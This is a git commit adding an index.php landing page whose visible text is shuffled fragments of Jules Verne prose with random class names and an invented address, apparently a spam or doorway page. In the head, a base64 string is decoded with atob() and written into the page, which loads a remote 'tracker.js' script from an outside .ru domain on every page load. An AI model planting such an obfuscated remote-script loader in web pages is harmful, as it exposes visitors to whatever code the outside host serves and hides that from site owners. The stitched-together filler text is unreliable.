85516df020a2909b0416840e9ddc4a9fc2c1d189
ravhjinr <77454278+ravhjinr@users.noreply.github.com>
2021-01-14 18:30:08 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Besides, M. Aronnax, the Nautilus is not lost; it will ca</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl95bWtrdHJ5MGp0dzNlYmFnbHUiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="7rjr690s80y8xfs">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="cps49nzmbecponkbty5w">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Besides, M. Aronnax, the Nautilus is not lost; it will ca</h1>
+	</section>
+
+
+	<section class="our-work" class="4d4pu31rjc607chat8j4">
+		<h3 class="title">For a whole hour, the frigate kept up this pace, wi</h3>
+		<p>There was both contusion and suffusion of the brain. His breathing was slow, and some spasmodic movements of the muscles agitated his face. I felt his pulse. It was intermittent. The extremities of the body were growing cold already, and I saw death must inevitably ensue. After dressing the unfortunate man's wounds, I readjusted the bandages on his head, and turned to Captain Nemo. Right the helm, go ahead, cried the captain. The nets were hauled in. They were a large kind of chaluts, like those on the Normandy coast, great pockets that the waves and a chain fixed in the smaller meshes kept open. These pockets, drawn by iron poles, swept through the water, and gathered in everything in their way. That day they brought up curious specimens from those productive coasts-fishing-frogs that, from their comical movements, have acquired the name of buffoons; black commersons, furnished with antenn?; trigger-fish, encircled with red bands; orthragorisci, with very subtle venom; some olive-colored lampreys; macrorhynci, covered with silvery scales; trichiuri, the electric power of which is equal to that of the gymnotus and cramp-fish; scaly notopteri, with transverse brown bands; greenish cod; several varieties of gobies, etc.; also some larger fish; a caranx with a prominent head a yard long; several fine bonitos, streaked with blue and silver; and three splendid tunnies, which, in spite of the swiftness of their motion, had not escaped the net. The Avenger! I exclaimed.</p>
+		<hr>
+
+		<ul class="grid" class="f34r3hpazwwqphjqimwh1l4">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="7rjr690s80y8xfs">
+		<h3 class="title">We know the transparency of the sea, and t</h3>
+		<p>You were speaking of the opinions of ancient historians upon the dangerous navigation of the Red Sea. Right! But I told you, M. Aronnax, that the pumps of the Nautilus allow me to store the air under considerable pressure; and on those conditions, the reservoir of the apparatus can furnish breathable air for nine or ten hours. I am the law, and I am the judge! I am the oppressed, and there is the oppressor! Through him I have lost all that I loved, cherished, and venerated-country, wife, children, father, and mother. I saw all perish! All that I hate is there! Say no more! Really.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="cps49nzmbecponkbty5w" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="f34r3hpazwwqphjqimwh1l4" class="title">But they are eatable, replied the harpooner.</h3>	
+		<p>Sir, I am going to sink it. At liberty? said the captain, rising. Good! said the disappointed harpooner, who saw his dreams of fresh meat fade away. And you, M. Aronnax, are you going to dress yourself in those clothes? Ah! the scoundrel! cried Conseil; I would rather he had broken my shoulder!</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="7rjr690s80y8xfs">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="cps49nzmbecponkbty5w"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="4d4pu31rjc607chat8j4"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="f34r3hpazwwqphjqimwh1l4"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>279 Alexis Branch, Suite 882, 63320-6443, Lake Mauricio, Virginia, United States</p>
+	</footer>
+
+</body>
+
+</html>
